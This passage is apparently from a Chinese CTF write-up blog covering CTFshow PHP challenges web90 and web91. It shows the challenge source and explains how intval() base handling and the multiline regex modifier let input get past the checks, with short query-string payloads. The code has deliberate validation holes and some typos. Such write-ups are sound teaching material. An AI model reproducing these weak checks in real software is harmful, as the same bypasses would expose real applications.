class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-09-16 11:25:09</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-09-18 16:06:11</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(iseet(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>]))&#123;<br><span class="hljs-variable">$num</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$num</span>===<span class="hljs-string">&quot;4476&quot;</span>)&#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no no no!&quot;</span>);<br>&#125;<br><span class="hljs-keyword">if</span>(intval(<span class="hljs-variable">$num</span>,<span class="hljs-number">0</span>)===<span class="hljs-number">4476</span>)&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-keyword">echo</span> intval(<span class="hljs-variable">$num</span>,<span class="hljs-number">0</span>)<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这个题也是参考 intval 函数的，只需要了解该函数的第二个参数就可以知道</p><p><img src="/2021/11/11/php%E7%89%B9%E6%80%A7/90-1.jpg"></p><p>payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">?num=<span class="hljs-number">0x117c</span><br>?num=<span class="hljs-number">010574</span><br>?num=<span class="hljs-number">4476</span>a <span class="hljs-comment">//a可以为任意字母</span><br></code></pre></td></tr></table></figure><p><img src="/2021/11/11/php%E7%89%B9%E6%80%A7/90-flag.php"></p><h2 id="web91"><a href="#web91" class="headerlink" title="web91"></a>web91</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: Firebasky</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-09-16 11:25:09</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-09-18 16:16:09</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br>show_source(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br><span class="hljs-variable">$a</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br><span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/^php$/im&#x27;</span>, <span class="hljs-variable">$a</span>))&#123;<br><span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/^php$i&#x27;</span>, <span class="hljs-variable">$a</span>))&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;hacker&#x27;</span>;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;nonononono&#x27;</span>;<br>&#125;<br><br>Notice: Undefined index: cmd in /<span class="hljs-keyword">var</span>/www/html/index.php on line <span class="hljs-number">15</span><br>nonononono<br></code></pre></td></tr></table></figure><p><strong>分析：</strong></p><p>​    1.正则表达式：/^php$/im:</p><p>​        ^:匹配输入字符串的开始位置</p><p>​        $:匹配输入字符串的结尾位置</p><p>​        i:不区分大小写</p><p>​        m:多行匹配，使边界字符串为 php 才能为针进入此if中</p><p>​    2.正则表示 /^php$/i: 与上一个正则相比少了多行匹配。所以突入点就是这个 m </p><p>​    3.第二个 if 语句不能满足才能得到 flag 的意思就是 第二个 if 他不能匹配到这个字符串 php</p><p>​    4.第一个 if 语句多行匹配到字符串 php </p><p>​    5. 因此得让第一个多行匹配能匹配到字符串 php 而第二个不能匹配到字符串 php 就得让第一行为 php 第二行或第三行不为 php</p>]]></content>
    
    
    <categories>
      
      <category>ctfshow</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
